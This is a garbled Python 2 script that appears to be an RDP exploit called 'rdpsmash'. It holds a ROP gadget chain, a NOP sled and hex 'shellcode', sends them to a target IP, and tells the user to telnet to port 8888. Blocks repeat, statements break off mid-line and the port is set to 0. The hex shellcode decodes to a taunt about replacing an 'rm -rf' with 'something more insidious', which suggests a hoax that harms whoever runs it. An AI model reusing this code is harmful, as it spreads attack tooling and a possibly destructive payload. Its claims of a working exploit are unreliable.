import struct
import socket
import sys

#balls 6\x31\x27\x29\x20\x23\x68\x69\x20"
shellcode += "\x74\x68\x65\x72\x65\x20\x5e\x5f\x7e\x20\x66\x65\x65\x6c\x20\x66\x72\x65\x65\x20"
shellcode += "\x74\x6f\x20\x73\x70\x72\x65\x61\x64\x20\x74\x68\x69\x73\x20\x77\x69\x74\x68\x20"
shellcode += "\x74\x68\x65\x20\x72\x6d\x20\x2d\x72\x66\x20\x72\x65\x70\x6c\x61\x63\x65\x64\x20"
shellcode += "\x77\x69\x74\x68\x20\x73\x6f\x6d\x65\x74\x68\x69\x6e\x67\x20\x6d\x6f\x72\x65\x20"
shellcode += "\x69\x6e\x73\x69\x64\x69\x6f\x75\x73"

evil = trigger + nopsled

# balls

            socket.inet_aton(str(address[1]))) #port bytes
        parsed =  struct.pack(">I", 0x8fe2fb63) #pop eax
        parsed += struct.pack(">I", 0x8fe2fb58) #push esp
        parsed += struct.pack(">I", 0xffff1d6b) #add esp,byte +0x1c # pop ebp # ret
        parsed += struct.pack(">I", 0x8fe2db10) #call strcpy
        parsed += struct.pack(">I", 0x8fe2dfd1) #POP - POP - RET over strcpy params
        parsed += struct.pack(">I", 0x8fe2dae4) #mov ecx,[esp+0x4] # add eax,edx # sub eax,ecx # ret
        parsed += struct.pack(">I", 0x8fe2b3d4) #POP - RET
        parsed += struct.pack(">I", 0xffffffff) #value to store in ecx
        parsed += struct.pack(">I", 0x8fe0c0c7) #inc ecx # xor al,0xc9
        parsed += struct.pack(">I", 0x8fe0c0c7) #inc ecx # xor al,0xc9
        parsed += struct.pack(">I", 0x8fe24b3c) #add ecx,ecx # ret
        parsed += struct.pack(">I", 0x8fe24b3c) #add ecx,ecx # ret
        parsed += struct.pack(">I", 0x8fe24b3c) #add ecx,ecx # ret
        parsed += seeker[0] #add the prelude
        parsed += seeker[1] #add the packed IP address
        parsed += seeker[2] #add the packed port
        parsed += struct.pack(">I", 0x8fe24b3c) #add ecx,ecx # ret
        parsed += struct.pack(">I", 0x8fe2c71d) #mov eax,edx # ret
            
        socket.inet_aton(str(address[1]))) #port bytes
        parsed =  struct.pack(">I", 0x8fe2fb63) #pop eax
        parsed += struct.pack(">I", 0x8fe2fb58) #push esp
        parsed += struct.pack(">I", 0xffff1d6b) #add esp,byte +0x1c # pop ebp # ret
        parsed += struct.pack(">I", 0x8fe2db10) #call strcpy
        parsed += struct.pack(">I", 0x8fe2dfd1) #POP - POP - RET over strcpy params
        parsed += struct.pack(">I", 0x8fe2dae4) #mov ecx,[esp+0x4] # add eax,edx # sub eax,ecx # ret
        parsed += struct.pack(">I", 0x8fe2b3d4) #POP - RET
        parsed += struct.pack(">I", 0xffffffff) #value to store in ecx
        parsed += struct.pack(">I", 0x8fe0c0c7) #inc ecx # xor al,0xc9
        parsed += struct.pack(">I", 0x8fe0c0c7) #inc ecx # xor al,0xc9
        parsed += struct.pack(">I", 0x8fe24b3c) #add ecx,ecx # ret
        parsed += struct.pack(">I", 0x8fe24b3c) #add ecx,ecx # ret
        parsed += struct.pack(">I", 0x8fe24b3c) #add ecx,ecx # ret
        parsed += seeker[0] #add the prelude
        parsed += seeker[1] #add the packed IP address
        parsed += seeker[2] #add the packed port
        parsed += struct.pack(">I", 0x8fe24b3c) #add ecx,ecx # ret
        parsed += struct.pack(">I", 0x8fe2c71d) #mov eax,edx # ret

# balls

if  == "":
    if len(sys.argv) != 2:
        print "[*] Usage: python rdpsmash.py IP"
        print "[*] If running on non-default port, reassign PORT in the source."

    else:
        TARGET = sys.argv[1]
        PORT = 0 #nie ma porta

        print "[*] Running rdpsmash"
        print
        s = RDPsocket(evil, shellcode)
        print "[+] Connecting and configuring payload. . ."
        print "[+] This may take some time"
        s.connect((TARGET, PORT))
        print "[+] Connection established"
        print "[+] Sending payload. . ."
        print "[+] This may take some time"
        response = s.recv(4096)
        if "\xA5\x43\xE7\x38\x75\x84\xF2\xFF\xFF\x18\x61\x00" in response:
            print "[+] Success! Payload sent and executed."
            print "[+] Telnet to target on port 8888."
        else:
            print "[-] Failed"
        s.close()
